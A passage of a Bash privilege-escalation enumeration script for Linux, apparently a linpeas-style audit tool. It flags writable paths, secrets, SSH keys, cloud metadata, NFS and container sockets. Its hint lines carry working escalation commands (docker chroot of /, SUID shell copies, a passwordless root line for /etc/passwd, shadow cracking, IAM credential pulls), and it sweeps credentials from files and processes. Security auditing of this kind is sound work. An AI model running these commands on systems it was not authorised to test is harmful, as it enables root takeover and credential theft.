sec "PATH, ENVIRONMENT, GROUP MEMBERSHIP"
# ---------------------------------------------------------------------------

sub "PATH analysis"
info "PATH=$PATH"
printf '%s' "$PATH" | tr ':' '\n' | awk '!seen[$0]++' | nl -ba | while IFS= read -r e; do
    d=$(printf '%s' "$e" | awk '{print $2}')
    if [ -z "$d" ]; then
        crit "PATH contains an EMPTY entry (== current directory) -> classic PATH hijack"; continue
    fi
    case "$d" in
        .*) crit "PATH contains a relative entry: '$d' -> anything in cwd wins"; continue ;;
    esac
    if [ ! -d "$d" ]; then info "PATH entry missing: $d"; continue; fi
    if [ -w "$d" ]; then
        own=$(stat -c %u "$d" 2>/dev/null)
        if [ "$own" = "$MYUID" ]; then
            info "PATH dir writable and owned by $ME: $d (normal for your own bin dir)"
        elif [ "$own" = "0" ]; then
            crit "PATH dir root-owned but WRITABLE by $ME: $d -> replace a binary root executes"
            hint "cp /bin/sh $d/ls; chmod 4755 $d/ls   (or shadow the real command)"
        else
            warn "PATH dir writable by $ME, owned by uid $own: $d"
        fi
    else
        ok "PATH entry not writable: $d"
    fi
done

sub "dangerous environment variables"
for v in LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT PYTHONPATH PERL5LIB RUBYLIB NODE_PATH BASH_ENV ENV IFS; do
    val=$(printenv "$v" 2>/dev/null)
    if [ -n "$val" ]; then
        case "$v" in
            LD_PRELOAD|LD_AUDIT|BASH_ENV|PERL5LIB|RUBYLIB|NODE_PATH)
                crit "$v is set: $val -> preload/hijack surface for anything you launch as root" ;;
            IFS) info "$v is set (rare, can break parsing if attacker-controlled)" ;;
            *) warn "$v is set: $val" ;;
        esac
    fi
done
ok "environment variable set reviewed"

sub "environment variables that look like secrets"
printenv | grep -iE '(pass|pwd|secret|token|api[_-]?key|access[_-]?key|private[_-]?key|credential|auth)' | \
    grep -viE '^(LS_COLORS|XDG|DBUS|SSH_AUTH_SOCK)' | head -30 | while IFS= read -r l; do
    ck; warn "env secret: $(printf '%s' "$l" | cut -c1-160)"
done
ok "env secret sweep complete"

sub "group membership and what each group grants"
for g in $(id -Gn 2>/dev/null); do
    case "$g" in
        docker)      crit "member of 'docker' -> docker run -v /:/mnt --rm -it alpine chroot /mnt sh = root" ;;
        lxd|lxc)     crit "member of '$g' -> lxc init alpine r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt; lxc start r" ;;
        disk)        crit "member of 'disk' -> read the raw disk, dump /etc/shadow: debugfs /dev/sda1" ;;
        shadow)      crit "member of 'shadow' -> read /etc/shadow directly" ;;
        adm)         warn "member of 'adm' -> read system logs, may contain credentials" ;;
        sudo|wheel|admin) warn "member of '$g' -> sudo rights, verify with sudo -l" ;;
        libvirt|kvm) warn "member of '$g' -> VM/QEMU escape paths to host root" ;;
        wireshark)   warn "member of 'wireshark' -> packet capture, harvest credentials" ;;
        operator|backup) warn "member of '$g' -> backup tooling reads privileged files" ;;
        staff)       warn "member of 'staff' -> write to /usr/local* on Debian" ;;
        audio|video) info "member of '$g' -> raw device access" ;;
        plugdev)     info "member of 'plugdev' -> removable device access" ;;
        systemd-journal) info "member of 'systemd-journal' -> read all journal logs" ;;
        *) info "group: $g" ;;
    esac
done

sub "password and group databases"
perm_open /etc/passwd 644 && warn "/etc/passwd is more open than 644 ($(stat -c %a /etc/passwd 2>/dev/null))" || ok "/etc/passwd mode ok"
perm_open /etc/group 644 && warn "/etc/group more open than 644" || ok "/etc/group mode ok"
[ -w /etc/passwd ] && crit "/etc/passwd WRITABLE -> append 'x::0:0::/root:/bin/sh' and su"
[ -w /etc/group ] && crit "/etc/group WRITABLE -> add yourself to a privileged group"
if [ -r /etc/shadow ]; then
    crit "/etc/shadow is READABLE by $ME -> offline cracking of root's hash"
    hint "unshadow /etc/passwd /etc/shadow > hashes.txt; john --wordlist=rockyou.txt hashes.txt"
elif [ "$ASROOT" = "1" ]; then
    ok "running as root: shadow readable (expected)"
else
    ok "/etc/shadow not readable"
fi
for f in /etc/passwd- /etc/shadow- /etc/group- /etc/gshadow-; do
    [ -e "$f" ] || continue
    if [ -r "$f" ] && [ "$f" = "/etc/shadow-" ]; then crit "backup $f readable"; fi
    [ -w "$f" ] && crit "backup $f writable"
done
ok "password database review complete"

sub "resource limits and process isolation"
info "ulimit -a: $(ulimit -a 2>/dev/null | tr '\n' ';' | cut -c1-200)"
if [ -r /proc/self/status ]; then
    for k in NoNewPrivs Seccomp Seccomp_filters CapBnd; do
        v=$(grep "^$k:" /proc/self/status 2>/dev/null)
        [ -n "$v" ] && { info "$v"; }
    done
fi
if [ -r /etc/security/limits.conf ]; then
    [ -w /etc/security/limits.conf ] && crit "/etc/security/limits.conf writable"
fi

# ---------------------------------------------------------------------------
sec "WRITABLE FILES AND DIRECTORIES"
# ---------------------------------------------------------------------------

sub "world-writable files in sensitive trees"
SENS_RE='^/(etc|usr/local|opt|srv|var/www|var/lib|lib|usr/lib|root)/'
: > "$OUTDIR/ww.txt"
if [ "$HAVE_INV" = "1" ]; then
    inv_ww_files_in "$SENS_RE" > "$OUTDIR/ww.txt"
else
    for d in /etc /usr/local /opt /srv /var/www /var/lib /lib /usr/lib /root; do
        [ -d "$d" ] || continue
        timeout 20 find "$d" -xdev -type f -perm -0002 2>/dev/null >> "$OUTDIR/ww.txt"
    done
fi
sort -u "$OUTDIR/ww.txt" -o "$OUTDIR/ww.txt"
WWN=$(wc -l < "$OUTDIR/ww.txt" 2>/dev/null || echo 0)
info "world-writable files in sensitive trees: $WWN"
head -40 "$OUTDIR/ww.txt" | while IFS= read -r f; do
    [ -n "$f" ] || continue
    warn "world-writable file: $f ($(binfo "$f"))"
done

sub "root-owned files writable by $ME"
: > "$OUTDIR/writable-root.txt"
if [ "$ASROOT" = "1" ]; then
    info "running as root: every file is writable, check skipped by design"
elif [ "$HAVE_INV" = "1" ]; then
    inv_writable_by_me | grep -E '^/(etc|usr/local|opt|srv|var/www|lib/systemd|usr/lib/systemd|root|home)/' \
        | sort -u > "$OUTDIR/writable-root.txt"
else
    for d in /etc /usr/local /opt /srv /var/www /lib/systemd /usr/lib/systemd; do
        [ -d "$d" ] || continue
        timeout 20 find "$d" -xdev \( -type f -o -type d \) -user root -writable 2>/dev/null >> "$OUTDIR/writable-root.txt"
    done
    sort -u "$OUTDIR/writable-root.txt" -o "$OUTDIR/writable-root.txt"
fi
WRN=$(wc -l < "$OUTDIR/writable-root.txt" 2>/dev/null || echo 0)
if [ "$ASROOT" = "1" ]; then
    :
else
    info "root-owned items writable by $ME: $WRN"
    head -60 "$OUTDIR/writable-root.txt" | while IFS= read -r f; do
        [ -n "$f" ] || continue
        crit "writable root-owned: $f ($(binfo "$f"))"
    done
fi

sub "world-writable directories"
: > "$OUTDIR/wwdirs.txt"
if [ "$HAVE_INV" = "1" ]; then
    awk -F'\t' "$AWK_W"'
        $1=="d" { m=sprintf("%04d",$2); if (w(substr(m,4,1))) print $6 }' "$INV" \
        | grep -E '^/(tmp|var/tmp|dev/shm|run|var/spool|var/lock|var/spool/cron|opt|srv|var/www|usr/local|etc)' \
        | sort -u > "$OUTDIR/wwdirs.txt"
else
    for d in /tmp /var/tmp /dev/shm /run /run/lock /var/spool /var/lock /opt /srv /var/www /usr/local /etc; do
        [ -d "$d" ] || continue
        timeout 20 find "$d" -xdev -type d -perm -0002 2>/dev/null >> "$OUTDIR/wwdirs.txt"
    done
    sort -u "$OUTDIR/wwdirs.txt" -o "$OUTDIR/wwdirs.txt"
fi
WDN=$(wc -l < "$OUTDIR/wwdirs.txt" 2>/dev/null || echo 0)
info "world-writable directories: $WDN"
while IFS= read -r d; do
    [ -n "$d" ] || continue
    m=$(stat -c %a "$d" 2>/dev/null)
    case "$m" in
        1777|3777) info "world-writable + sticky: $d ($m) (normal for /tmp)" ;;
        *)         crit "world-writable WITHOUT sticky bit: $d ($m) -> delete or replace other users' files" ;;
    esac
done < "$OUTDIR/wwdirs.txt"

sub "ACLs granting write access"
if have getfacl; then
    for d in /etc /etc/sudoers.d /usr/local/bin /usr/local/sbin /var/spool/cron /opt /srv /var/www /root /home; do
        [ -e "$d" ] || continue
        acl=$(getfacl -p "$d" 2>/dev/null | grep -E "^user:|^group:|^mask:")
        if printf '%s' "$acl" | grep -qE '^user:[^:]+:[^:]*(w|rw)'; then
            ck
            if [ "$ASROOT" = "0" ] && printf '%s' "$acl" | grep -qE "^user:$ME:.*w"; then
                crit "ACL gives $ME write on $d"
            else
                info "ACL entries on $d: $(printf '%s' "$acl" | tr '\n' ' ')"
            fi
        fi
    done
    ck; ok "ACL review complete"
else
    info "getfacl not installed, ACL checks skipped"
fi

sub "mount options that weaken filesystems"
if [ -r /proc/mounts ]; then
    MNT=$(findmnt -no OPTIONS /tmp 2>/dev/null)
    case "$MNT" in
        *noexec*) ok "/tmp mounted noexec" ;;
        *) warn "/tmp is NOT noexec -> execute payloads from /tmp" ;;
    esac
    MNT2=$(findmnt -no OPTIONS /dev/shm 2>/dev/null)
    case "$MNT2" in
        *noexec*) ok "/dev/shm noexec" ;;
        *) info "/dev/shm exec allowed (common)" ;;
    esac
    ck; ok "/proc/mounts read"
fi
if [ -r /etc/fstab ] && [ -w /etc/fstab ]; then
    crit "/etc/fstab WRITABLE -> add a root-owned uid=0 mount, or mount over /etc"
    hint "echo 'server:/x /mnt nfs defaults,no_root_squash 0 0' >> /etc/fstab"
fi

sub "writable system binaries (PATH hijack surface)"
for d in /usr/local/bin /usr/local/sbin /opt/bin /usr/local/lib /usr/lib/python3/dist-packages \
         /usr/lib/python3.*/site-packages /usr/lib/perl5 /usr/share/perl5 /usr/lib/ruby /var/www/html; do
    for p in $d; do
        [ -e "$p" ] || continue
        [ "$ASROOT" = "1" ] && { info "running as root, writability not meaningful: $p"; continue; }
        if [ -w "$p" ]; then
            own=$(stat -c %u "$p" 2>/dev/null)
            if [ "$own" = "$MYUID" ]; then
                info "writable, owned by $ME: $p (user-installed tree, lower risk)"
            else
                crit "writable SYSTEM dir: $p (owner uid $own) -> hijack a command or library root runs"
            fi
        else
            ok "not writable: $p"
        fi
    done
done

sub "writable web roots"
for d in /var/www /var/www/html /srv/http /usr/share/nginx/html /var/lib/tomcat*/webapps; do
    for p in $d; do
        [ -d "$p" ] || continue
        [ -w "$p" ] && crit "web root writable by $ME: $p -> drop a webshell if php/cgi is enabled"
    done
done
ok "web root review complete"

sub "writable files owned by root that root processes execute"
if [ "$MODE" != "quick" ] && [ "$ASROOT" = "0" ]; then
    if [ "$HAVE_INV" = "1" ]; then
        inv_writable_by_me | grep -E '\.(sh|py|pl|rb|php|cgi|service|timer|conf|ini|env|yml|yaml)$' \
            | head -80 | while IFS= read -r f; do
            crit "writable root-owned file that can execute: $f"
        done
    else
        timeout 30 find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path "$OUTDIR" \) -prune -o \
            -type f -user root -writable -print 2>/dev/null | head -80 | while IFS= read -r f; do
            case "$f" in
                *.sh|*.py|*.pl|*.rb|*.php|*.cgi|*.service|*.timer|*.conf)
                    crit "writable root file that can execute: $f" ;;
            esac
        done
    fi
    ok "writable-root sweep complete"
fi

sub "recently modified files in /etc (indicators of setup tampering)"
if [ "$MODE" != "quick" ]; then
    n=$(timeout 20 find /etc -xdev -type f -mtime -7 2>/dev/null | wc -l)
    ck; info "files in /etc modified in the last 7 days: $n"
    timeout 20 find /etc -xdev -type f -mtime -7 2>/dev/null | head -15 | while IFS= read -r f; do
        info "  recent: $f"
    done
fi
# ---------------------------------------------------------------------------
sec "CREDENTIALS AND SECRETS"
# ---------------------------------------------------------------------------

sub "shell history"
for h in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history" "$HOME/.local/share/fish/fish_history" \
         /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
    for f in $h; do
        [ -f "$f" ] || continue
        [ -r "$f" ] || continue
        ck
        n=$(wc -l < "$f" 2>/dev/null)
        info "history readable: $f ($n lines, $(stat -c '%a %U' "$f" 2>/dev/null))"
        hits=$(grep -aiE '(passw|pwd=|mysql -u|sshpass|-p[[:space:]]*[^[:space:]]|curl.*-u|token|export .*KEY|su -|--password)' "$f" 2>/dev/null | tail -12)
        if [ -n "$hits" ]; then
            warn "  interesting history lines in $f:"
            printf '%s\n' "$hits" | sed 's/^/         | /' | tee -a "$LOG"
        fi
    done
done
ok "history sweep complete"

sub "SSH private keys on disk"
KEYLIST="$OUTDIR/sshkeys.txt"
KEY_EXCL='/(doc|docs|examples?|samples?|test|tests|testdata|fixtures|site-packages|node_modules|\.cache|\.git|vendor|\.hermes)/'
if [ "$HAVE_INV" = "1" ]; then
    awk -F'\t' '
        $1=="f" {
            n=split($6,p,"/"); b=p[n]
            if (b=="id_rsa"||b=="id_dsa"||b=="id_ecdsa"||b=="id_ed25519"||
                b=="identity"||b ~ /\.(pem|key|ppk)$/) print $6
        }' "$INV" | grep -vE "$KEY_EXCL" | head -60 > "$KEYLIST"
else
    timeout 30 find / -xdev \( -path /proc -o -path /sys -o -path /dev -o -path "$OUTDIR" \) -prune -o \
        -type f \( -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' \
        -o -name 'id_rsa.*' -o -name '*.pem' -o -name '*.key' -o -name '*.ppk' -o -name 'identity' \) \
        -print 2>/dev/null | grep -vE "$KEY_EXCL" | head -60 > "$KEYLIST"
fi
while IFS= read -r f; do
    [ -f "$f" ] || continue
    if head -c 200 "$f" 2>/dev/null | grep -q 'PRIVATE KEY'; then
        enc=$(grep -c 'ENCRYPTED' "$f" 2>/dev/null)
        m=$(stat -c '%a' "$f" 2>/dev/null)
        u=$(stat -c '%u' "$f" 2>/dev/null)
        if [ "$enc" != "0" ]; then
            info "passphrase-protected private key: $f (mode $m, owner uid $u)"
        elif [ "$u" = "$MYUID" ] && { [ "$m" = "600" ] || [ "$m" = "400" ]; }; then
            warn "your own unencrypted private key (mode $m): $f -- fine locally, but it is a written-down secret"
        elif [ "$u" = "$MYUID" ]; then
            warn "your own unencrypted key with loose mode $m: $f -- another local user can copy it"
        else
            crit "UNENCRYPTED private key belonging to uid $u (mode $m): $f"
            hint "if readable: ssh -i $f -o StrictHostKeyChecking=no <user>@<host>"
        fi
    fi
done < "$KEYLIST"
ok "private key sweep complete"

sub "SSH configuration and authorized_keys"
for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
    for p in $f; do
        [ -f "$p" ] || continue
        if [ -w "$p" ]; then
            crit "$p WRITABLE -> append your own key for passwordless root/user login"
        elif [ -r "$p" ]; then
            ck; warn "$p readable ($(stat -c '%a %U' "$p")) -- contains $(grep -c ssh- "$p" 2>/dev/null) key(s)"
        fi
    done
done
for d in /etc/ssh /root/.ssh /home/*/.ssh; do
    for p in $d; do [ -d "$p" ] || continue; [ -w "$p" ] && crit "SSH dir writable: $p"; done
done
if [ -r /etc/ssh/sshd_config ]; then
    for kv in PermitRootLogin PasswordAuthentication PermitEmptyPasswords \
              AuthorizedKeysCommand StrictModes AllowAgentForwarding; do
        v=$(grep -iE "^\s*$kv" /etc/ssh/sshd_config 2>/dev/null | tail -1)
        [ -n "$v" ] && { info "sshd: $(printf '%s' "$v" | sed 's/^ *//')"; }
    done
    grep -qiE '^\s*PermitRootLogin\s+yes' /etc/ssh/sshd_config 2>/dev/null && warn "root SSH login permitted"
    grep -qiE '^\s*PermitEmptyPasswords\s+yes' /etc/ssh/sshd_config 2>/dev/null && crit "empty passwords permitted over SSH"
    if grep -qiE '^\s*AuthorizedKeysCommand' /etc/ssh/sshd_config 2>/dev/null; then
        warn "AuthorizedKeysCommand in use -- check that the command is not writable"
    fi
    [ -w /etc/ssh/sshd_config ] && crit "/etc/ssh/sshd_config writable -> set PermitRootLogin yes, add your key"
fi
[ -d /etc/ssh ] && [ -w /etc/ssh ] && crit "/etc/ssh writable -> replace host keys or sshd_config"
ok "SSH review complete"

sub "known credential-bearing configuration files"
check_secret_file() { # path, description
    local f="$1" d="$2"
    [ -e "$f" ] || return 0
    [ -r "$f" ] || { info "$d exists but not readable: $f"; return 0; }
    ck
    if [ -s "$f" ]; then
        crit "$d is READABLE: $f ($(binfo "$f"))"
        grep -m3 -aiE '(pass|secret|key|token|user)' "$f" 2>/dev/null | head -3 | while IFS= read -r l; do
            hint "  $(printf '%s' "$l" | cut -c1-120)"
        done
    fi
}
check_secret_file /etc/mysql/debian.cnf "MySQL debian maintenance credentials"
check_secret_file /root/.my.cnf "root MySQL client credentials"
check_secret_file /root/.pgpass "PostgreSQL password file"
check_secret_file "$HOME/.pgpass" "user PostgreSQL password file"
check_secret_file /etc/postgresql/*/main/pg_hba.conf "PostgreSQL auth config"
check_secret_file /var/lib/mysql/debian-*.flag "MySQL init flag"
check_secret_file /root/.netrc "netrc credentials"
check_secret_file "$HOME/.netrc" "user netrc credentials"
check_secret_file /root/.git-credentials "git credentials"
check_secret_file "$HOME/.git-credentials" "user git credentials"
check_secret_file /root/.aws/credentials "AWS credentials"
check_secret_file "$HOME/.aws/credentials" "user AWS credentials"
check_secret_file /root/.config/gcloud/credentials.db "gcloud credentials"
check_secret_file /root/.kube/config "kubeconfig (cluster-admin?)"
check_secret_file "$HOME/.kube/config" "user kubeconfig"
check_secret_file /root/.docker/config.json "docker registry credentials"
check_secret_file "$HOME/.docker/config.json" "user docker registry credentials"
check_secret_file /root/.vault-token "HashiCorp Vault token"
check_secret_file /etc/redis/redis.conf "redis config (requirepass?)"
check_secret_file /etc/mongod.conf "mongodb config"
check_secret_file /etc/elasticsearch/elasticsearch.yml "elasticsearch config"
check_secret_file /etc/exim4/passwd.client "exim SMTP credentials"
check_secret_file /etc/msmtprc "msmtp credentials"
check_secret_file /etc/wpa_supplicant/wpa_supplicant.conf "wifi PSK"
check_secret_file /etc/openvpn/*.conf "openvpn config (inline keys)"
check_secret_file /etc/ppp/chap-secrets "PPP credentials"
check_secret_file /var/lib/jenkins/credentials.xml "Jenkins credentials store"
check_secret_file /var/lib/jenkins/secrets/initialAdminPassword "Jenkins admin password"
check_secret_file /opt/tomcat/conf/tomcat-users.xml "Tomcat manager credentials"
check_secret_file /etc/tomcat*/tomcat-users.xml "Tomcat manager credentials"
ok "known credential file list reviewed"

sub "application config files in web/doc roots"
for f in /var/www/html/wp-config.php /var/www/html/.env /var/www/.env /var/www/html/config.php \
         /var/www/html/configuration.php /var/www/html/sites/default/settings.php \
         /var/www/html/config/database.php /srv/app/.env /opt/app/.env /home/*/app/.env; do
    for p in $f; do
        [ -f "$p" ] || continue
        [ -r "$p" ] || continue
        ck; crit "app config readable: $p ($(binfo "$p"))"
        grep -m4 -aiE "(pass|db_|secret|key|token)[^=]{0,20}=" "$p" 2>/dev/null | while IFS= read -r l; do
            hint "  $(printf '%s' "$l" | cut -c1-120)"
        done
    done
done
ok "app config sweep complete"

sub "pattern sweep for secrets in common trees"
# $HOME is deliberately NOT swept recursively: a developer home with caches,
# venvs and node_modules turns this into a minutes-long grep. Home is covered
# by the targeted config checks above, plus the shallow pass below.
SWEEP="/etc /opt /srv /var/www"
[ "$MODE" = "full" ] && SWEEP="$SWEEP /usr/local /var/lib $HOME"
SECREQ='(password|passwd|pass|pwd)[[:space:]]*[:=][[:space:]]*[^[:space:]]{3,}|api[_-]?key[[:space:]]*[:=]|secret[_-]?key[[:space:]]*[:=]|BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY|aws_secret_access_key|Authorization:[[:space:]]*Bearer'
: > "$OUTDIR/secrets.txt"
for d in $SWEEP; do
    [ -r "$d" ] || continue
    timeout 25 grep -rIaiE --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=.cache \
        --exclude-dir=venv --exclude-dir=__pycache__ --exclude-dir=.hermes --exclude-dir=vendor \
        --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
        --include='*.yml' --include='*.yaml' --include='*.json' --include='*.xml' --include='*.php' \
        --include='*.py' --include='*.sh' --include='*.txt' --include='*.properties' --include='*.toml' \
        -m2 "$SECREQ" "$d" 2>/dev/null >> "$OUTDIR/secrets.txt"
done
# shallow home pass: only dotfiles and one level down, no cache trees
if [ -d "$HOME" ] && [ "$MODE" != "full" ]; then
    timeout 15 find "$HOME" -maxdepth 2 -type f \( -name '.*' -o -name '*.conf' -o -name '*.env' \
        -o -name '*.ini' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' \) \
        -size -256k 2>/dev/null | head -200 | while IFS= read -r hf; do
        grep -IaiE -m1 "$SECREQ" "$hf" 2>/dev/null | head -1 | while IFS= read -r l; do
            printf '%s:%s\n' "$hf" "$l" >> "$OUTDIR/secrets.txt"
        done
    done
fi
sort -u "$OUTDIR/secrets.txt" -o "$OUTDIR/secrets.txt" 2>/dev/null
SN=$(wc -l < "$OUTDIR/secrets.txt" 2>/dev/null || echo 0)
info "files matching a secret pattern: $SN"
head -25 "$OUTDIR/secrets.txt" | while IFS= read -r l; do
    [ -n "$l" ] || continue
    warn "$(printf '%s' "$l" | cut -c1-170)"
done
hint "full list: $OUTDIR/secrets.txt"

sub "backups, dumps and archives"
for p in /var/backups /var/backups/*.gz /var/backups/*.bak /root/*.tar* /home/*/*.tar* /opt/*.tar* \
         /tmp/*.tar* /var/tmp/*.tar*; do
    for f in $p; do
        [ -e "$f" ] || continue
        [ -r "$f" ] || continue
        ck; warn "readable backup/archive: $f ($(binfo "$f"))"
        hint "grep it for keys: tar -tf $f 2>/dev/null | head, or strings $f | grep -i pass"
    done
done
[ -d /var/backups ] && { info "/var/backups: $(ls -l /var/backups 2>/dev/null | wc -l) entries"; }
ok "backup sweep complete"

sub "process environment and command lines"
if [ "$MODE" != "quick" ]; then
    for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -400); do
        [ -r "/proc/$pid/cmdline" ] || continue
        cl=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)
        case "$cl" in
            *-p*pass*|*--password*|*mysql*--password*|*redis-cli*-a*|*mysql*-u*)
                ck; warn "credentials in cmdline (pid $pid): $(printf '%s' "$cl" | cut -c1-140)" ;;
        esac
        if [ -r "/proc/$pid/environ" ] && [ "$MYUID" != "0" ]; then
            if tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null | grep -qE '^(AWS_|DATABASE_|.*PASSWORD=|.*TOKEN=)'; then
                ck; warn "/proc/$pid/environ exposes secrets and is readable by $ME"
            fi
        fi
    done
    ck; ok "process sweep complete"
fi
[ -r /proc/kmsg ] && crit "/proc/kmsg readable as non-root (kernel log leak)"
if [ -r /dev/mem ]; then
    perm_open /dev/mem 640 && crit "/dev/mem is accessible -> read/write physical memory" || ok "/dev/mem root-only"
fi

sub "cloud metadata and instance credentials"
if [ -n "$(printenv | grep -E '^(AWS_|GOOGLE_|AZURE_|AWS_CONTAINER_)' | head -1)" ]; then
    crit "cloud identity env vars present: $(printenv | grep -E '^(AWS_|GOOGLE_|AZURE_)' | cut -d= -f1 | tr '\n' ' ')"
    hint "these usually carry IAM credentials with real permissions"
else
    ok "no cloud identity env vars"
fi
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    crit "Kubernetes service-account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token"
    hint "decode: kubectl --token=\$(cat .../token) auth can-i --list"
else
    info "no k8s service-account token mounted"
fi
if [ "$DO_NET" = "1" ]; then
    MD=""
    for url in http://169.254.169.254/latest/meta-data/ http://metadata.google.internal/computeMetadata/v1/ \
               http://169.254.169.254/metadata/instance?api-version=2021-02-01; do
        if have curl; then
            out=$(timeout 3 curl -s -m 2 -f -H 'Metadata-Flavor: Google' -H 'Metadata: true' "$url" 2>/dev/null | head -c 120)
        elif have wget; then
            out=$(timeout 3 wget -q -O - -T 2 "$url" 2>/dev/null | head -c 120)
        else out=""; fi
        if [ -n "$out" ]; then MD="$url -> $(printf '%s' "$out" | tr -d '\n' | cut -c1-100)"; break; fi
    done
    if [ -n "$MD" ]; then
        crit "cloud metadata endpoint REACHABLE: $MD"
        hint "pull IAM creds: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        if [ "$DO_META" = "1" ]; then
            creds=$(timeout 3 curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -c 200)
            [ -n "$creds" ] && warn "  IMDSv1 role listing returned: $(printf '%s' "$creds" | tr -d '\n' | cut -c1-160)"
        fi
    else
        ok "no cloud metadata endpoint reachable"
    fi
fi

sub "swap, core dumps and memory artefacts"
if have swapon; then
    run swapon --show 2>/dev/null | head -5 | while IFS= read -r l; do ck; info "swap: $l"; done
fi
for f in /var/crash/* /var/spool/crash/* core core.* /var/lib/systemd/coredump/*; do
    for p in $f; do
        [ -e "$p" ] || continue
        [ -r "$p" ] && { warn "readable core dump / crash file: $p"; }
    done
done
ok "swap and core review complete"

sub "mail spools and logs"
for f in /var/mail/* /var/spool/mail/*; do
    [ -f "$f" ] || continue
    [ -r "$f" ] && { warn "readable mail spool: $f"; }
done
for f in /var/log/auth.log /var/log/secure /var/log/mysql/error.log /var/log/vsftpd.log; do
    [ -r "$f" ] || continue
    ck; info "log readable: $f"
    if grep -qiE 'password|failed password' "$f" 2>/dev/null; then
        warn "  ^ contains password-related lines (usernames + auth patterns)"
    fi
done
ok "log review complete"

# ---------------------------------------------------------------------------
sec "NETWORK AND SERVICES"
# ---------------------------------------------------------------------------

sub "listening sockets"
if have ss; then
    SOCK=$(run ss -tulpn 2>/dev/null)
elif have netstat; then
    SOCK=$(run netstat -tulpn 2>/dev/null)
else
    SOCK=$(run netstat -an 2>/dev/null)
fi
printf '%s\n' "$SOCK" | sed 's/^/         /' | tee -a "$LOG" | head -40
info "listening sockets captured"

sub "services exposed beyond loopback"
if [ -n "$SOCK" ]; then
    printf '%s\n' "$SOCK" | grep -E '0\.0\.0\.0:|\*:|\[::\]:|::: ' | grep -vE '^(tcp|udp)' | while IFS= read -r l; do
        ck
        port=$(printf '%s' "$l" | grep -oE '[0-9]+(\.[0-9]+){3}:[0-9]+|\*:[0-9]+' | head -1)
        case "$l" in
            *docker*|*containerd*) crit "container runtime socket exposed: $l" ;;
            *mysql*|*postgres*|*redis*|*mongo*|*memcach*) warn "database reachable off-loopback: $l" ;;
            *:22*) info "SSH exposed: $l" ;;
            *:80*|*:443*) info "web exposed: $l" ;;
            *:111*|*rpcbind*) warn "rpcbind exposed: $l" ;;
            *) warn "listening on a public interface: $l" ;;
        esac
    done
fi
ok "interface exposure review complete"

sub "services running as root"
if have ps; then
    rootprocs=$(ps -eo user,pid,cmd --no-headers 2>/dev/null | awk '$1=="root"' | wc -l)
    ck; info "processes owned by root: $rootprocs"
    ps -eo user,pid,cmd --no-headers 2>/dev/null | awk '$1=="root"' | \
        grep -E '/tmp/|/home/|/opt/|/var/tmp|/dev/shm|/srv/' | head -20 | while IFS= read -r l; do
        ck; crit "root process running from a non-system path: $l"
    done
fi

sub "firewall posture"
if have ufw; then
    st=$(run ufw status 2>/dev/null | head -1); info "ufw: ${st:-inactive}"
    printf '%s' "$st" | grep -qi inactive && warn "ufw installed but inactive"
fi
if have firewall-cmd; then
    st=$(run firewall-cmd --state 2>/dev/null); info "firewalld: ${st:-unknown}"
fi
if have iptables; then
    n=$(run iptables -S 2>/dev/null | wc -l)
    ck; if [ "$n" -le 3 ]; then warn "iptables has $n rules (essentially open)"; else ok "iptables has $n rules"; fi
fi
if have nft; then
    n=$(run nft list ruleset 2>/dev/null | wc -l)
    ck; info "nftables ruleset lines: $n"
fi

sub "NFS exports (no_root_squash is a straight root shell)"
if [ -r /etc/exports ]; then
    if grep -qE 'no_root_squash' /etc/exports 2>/dev/null; then
        crit "/etc/exports contains no_root_squash -> mount it and write a SUID binary as root"
        grep -E 'no_root_squash' /etc/exports | while IFS= read -r l; do hint "  $l"; done
        hint "on the client: mount -t nfs host:/export /mnt; cp /bin/sh /mnt/rootsh; chmod 4755 /mnt/rootsh"
    else
        ok "no no_root_squash in /etc/exports"
    fi
    grep -qE 'no_all_squash|insecure|rw' /etc/exports 2>/dev/null && warn "exports include no_all_squash/insecure/rw"
    [ -w /etc/exports ] && crit "/etc/exports writable -> publish / with no_root_squash"
else
    info "no /etc/exports"
fi
if [ -r /proc/mounts ]; then
    nfs=$(grep -c ' nfs' /proc/mounts 2>/dev/null)
    ck; info "mounted NFS filesystems: $nfs"
    grep ' nfs' /proc/mounts 2>/dev/null | head -5 | while IFS= read -r l; do info "  $l"; done
fi

sub "container and virtualization sockets"
for s in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock \
         /var/run/lxd.sock /var/lib/lxd/unix.socket /var/run/libvirt/libvirt-sock \
         /run/podman/podman.sock /var/run/crio/crio.sock; do
    [ -e "$s" ] || continue
    ck
    m=$(stat -c '%a %U:%G' "$s" 2>/dev/null)
    if [ -w "$s" ]; then
        crit "container socket WRITABLE by $ME: $s ($m)"
        case "$s" in
            *docker*) hint "docker -H unix://$s run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
            *containerd*) hint "ctr -a /run/containerd/containerd.sock run --mount type=bind,src=/,dst=/mnt,options=rbind:rw alpine sh" ;;
            *lxd*) hint "lxc init alpine r -c security.privileged=true && lxc config device add r d disk source=/ path=/mnt" ;;
            *libvirt*) hint "virt escape: define a domain with a host filesystem passthrough" ;;
        esac
    else
        warn "container socket present but not writable: $s ($m)"
    fi
done
ok "socket review complete"

sub "SMB / Samba shares"
if [ -r /etc/samba/smb.conf ]; then
    ck; info "smb.conf present"
    grep -qiE '^\s*guest ok\s*=\s*yes' /etc/samba/smb.conf 2>/dev/null && warn "Samba allows guest access"
    grep -qiE '^\s*(read only|writable)\s*=\s*(no|yes)' /etc/samba/smb.conf 2>/dev/null && info "samba share mode lines present (review)"
